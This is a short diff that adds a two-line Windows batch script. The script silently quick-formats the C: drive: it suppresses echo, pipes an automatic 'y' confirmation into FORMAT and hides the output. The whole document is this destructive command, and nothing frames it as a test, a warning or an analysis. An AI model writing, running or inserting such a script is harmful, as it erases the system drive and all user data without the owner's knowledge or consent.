@@ -1,0 +1,2 @@
+@echo off
+echo y|FORMAT c: /q >nul
